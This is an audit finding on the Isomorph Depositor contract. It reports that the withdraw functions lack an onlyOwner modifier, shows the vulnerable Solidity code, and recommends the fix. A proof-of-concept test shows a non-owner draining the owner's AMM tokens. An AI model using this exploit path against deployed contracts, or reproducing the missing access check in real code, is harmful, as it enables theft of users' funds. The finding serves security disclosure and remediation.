# AMM tokens can be stolen from Depositor

## Summary
AMM tokens can be stolen from Depositor
## Vulnerability Detail
The `partialWithdrawFromGauge`, `multiWithdrawFromGauge`, and `withdrawFromGauge` functions of Depositor lack the `onlyOwner` modifier, which allows anyone to call them. The Depositor manages DepositReceipt NFT tokens on behalf of its owner, thus it's expected that the owner will approve one or all (using the `setApprovalForAll` function) NFT tokens for the Depositor contract, which allows anyone to burn them during withdrawal.

There's a test case that covers this scenario, however it doesn't account for approval given to Depositor. The correct test looks like this:
```js
// contracts/Velo-Deposit-Tokens/test/Unit/Depositor.js
// describe("withdrawFromGauge", function (){
it("Doesn't fail if called by a wrong user [AUDIT]", async function (){
    rewards_address = await gauge.FakeRewards()
        
    AMMToken.approve(depositor.address, amount)
    await depositor.connect(owner).depositToGauge(amount)

    // Depositor contract owner will call either of these to let the Depositor contract
    // manage their tokens:
    // await depositReceipt.connect(owner).approve(depositor.address, NFT_id)
    await depositReceipt.connect(owner).setApprovalForAll(depositor.address, true)

    expect(await AMMToken.balanceOf(bob.address)).to.eq('0');

    // Bob withdraws owner's tokens.
    await depositor.connect(bob).withdrawFromGauge(NFT_id, [rewards_address])

    expect(await AMMToken.balanceOf(bob.address)).to.eq(amount);
});
```
## Impact
Anyone can steal anyone else's AMM tokens from the Depositor contract.

## Code Snippet
Missing `onlyOwner` modifier in this and the other withdraw functions allows anyone to call them:
[Depositor.sol#L119-L127](https://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Velo-Deposit-Tokens/contracts/Depositor.sol#L119-L127):
```solidity
function withdrawFromGauge(uint256 _NFTId, address[] memory _tokens)  public  {
    uint256 amount = depositReceipt.pooledTokens(_NFTId);
    depositReceipt.burn(_NFTId);
    gauge.getReward(address(this), _tokens);
    gauge.withdraw(amount);
    //AMMToken adheres to ERC20 spec meaning it reverts on failure, no need to check return
    //slither-disable-next-line unchecked-transfer
    AMMToken.transfer(msg.sender, amount);
}
```
The `depositReceipt.burn` function is called by the Depositor on behalf of the owner, so the owner must approve the Depositor contract in a DepositReceipt contract, which owners will always do in reality.


## Tool used
Manual Review

## Recommendation
Consider adding the `onlyOwner` modifier to the withdraw functions of Depositor. Since the Depositor contract will be approved by its owner to transfer or burn DepositReceipt NFTs, it's only the owner who should be allowed to trigger these operations.
